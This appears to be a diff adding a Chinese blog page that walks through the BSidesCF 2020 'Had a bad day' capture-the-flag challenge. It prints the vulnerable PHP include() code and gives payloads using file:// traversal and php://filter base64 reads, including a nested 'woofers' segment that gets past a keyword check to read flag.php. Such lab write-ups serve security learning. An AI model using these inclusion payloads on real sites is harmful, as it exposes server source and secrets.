@@ -1,0 +1,376 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习16 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2021-04-13">2021-04-13</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习16</h2>
+            <div class="post-meta">
+                emm... 5630 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>今天做题知道了一个关于php伪协议的一个小知识点，记录下来。  </p>
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开题目，发现是一个选择页面，有两个选项，如果选择woofers会出现狗的照片，选择meowers就会出现猫的图片，但是我们可以发现当选择其中一个选项后url会发生变化。   </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"><img src="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"></a>  </p>
+<p>此时的url为：  </p>
+<pre><code>http://1b3467ab-92b7-481e-8f37-18bbc1f7e16b.node3.buuoj.cn/index.php?category=woofers  </code></pre>
+<p>可以看到，这里是用get方式上传了category变量，当这个变量为woofers时显示狗的照片，为meowers时显示猫的照片。  </p>
+<p>根据这个发现，我们可以想到ssrf攻击（有关ssrf攻击可以看我之前的博客。）而ssrf攻击时可以通过file://来读取文件的。  </p>
+<p>那我们这样构造payload。  </p>
+<pre><code>?category=file://../../flag  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"><img src="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"></a>  </p>
+<p>发现flag应该是被过滤了。  </p>
+<p>那么我们查看网页源代码。   </p>
+<pre><code>?category=file://../../index  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"><img src="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"></a>  </p>
+<p>这里发现报错了。是一个include()函数的报错，从这里我们可以知道这道题是一个include()函数漏洞，我们上传的category的参数会传入include()函数中。   </p>
+<p>那么我们就可以使用伪协议来利用include()漏洞。   </p>
+<p>我们这样构造：  </p>
+<pre><code>?category=php://filter/read=convert.base64-encode/resource=index  </code></pre>
+<p>注意这里文件名是index而不是index.php，这是因为代码中会给你添加上后缀名（如果上传index.php，报错时会显示index.php.php，说明代码中已经加上了文件后缀。  </p>
+<p>这样我们就能得到源码，解码后如下：  </p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+&lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;
+&lt;title&gt;Had a bad day?&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;
+  &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;
+    &lt;div class=&quot;mdl-layout__header-row&quot;&gt;
+      &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;
+      &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;
+    &lt;div&gt;
+  &lt;/header&gt;
+  &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;
+  &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;
+    &lt;div class=&quot;page-container mdl-grid&quot;&gt;
+      &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;
+      &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;
+        &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;
+        &lt;/div&gt;
+        &lt;h3&gt;Cheer up!&lt;/h3&gt;
+          &lt;p&gt;
+            Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
+          &lt;/p&gt;
+          &lt;div class=&quot;page-include&quot;&gt;
+          &lt;?php
+            $file = $_GET[&#39;category&#39;];
+
+            if(isset($file))
+            &#123;
+                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                    include ($file . &#39;.php&#39;);
+                &#125;
+                else&#123;
+                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+                &#125;
+            &#125;
+            ?&gt;
+        &lt;/div&gt;
+      &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;
+          &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;
+          &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;
+      &lt;/form&gt;
+
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/main&gt;
+&lt;/div&gt;
+&lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;  </code></pre>
+<p>我们挑出其中有用代码：  </p>
+<pre><code>           &lt;?php
+            $file = $_GET[&#39;category&#39;];
+
+            if(isset($file))
+            &#123;
+                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                    include ($file . &#39;.php&#39;);
+                &#125;
+                else&#123;
+                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+                &#125;
+            &#125;
+            ?&gt;  </code></pre>
+<p>可以看到确实和我们想的差不多，上传的变量参数如果有woofers，meowers，index其中一个，那么就会显示相关的php文件内容。  </p>
+<p>但是我们可以看到，对于变量只做了一个匹配，那就是上传的字符串中必须有上面三个字符串中的一个。才能执行include()函数。那么我们的伪协议中也就必须要有这三个字符串中的一个。  </p>
+<p>这里就涉及到了伪协议的一个小知识点：嵌套使用。   </p>
+<p>如果我们这样构造：  </p>
+<pre><code>?category=php://filter/read=convert.base64-encode/woofers/resource=flag  </code></pre>
+<p>可以看到，我们在伪协议中嵌套了一层协议，添加了一个woofers，这样既满足了对于上传参数的匹配，又可以成功读取到flag.php文件。   </p>
+<p><a target="_blank" rel="noopener" href="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"><img src="https://img.imgdb.cn/item/607ac7738322e6675ce845ff.png"></a>  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>感觉这个知识点就是一种绕过的方式，可以积累一下。</p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
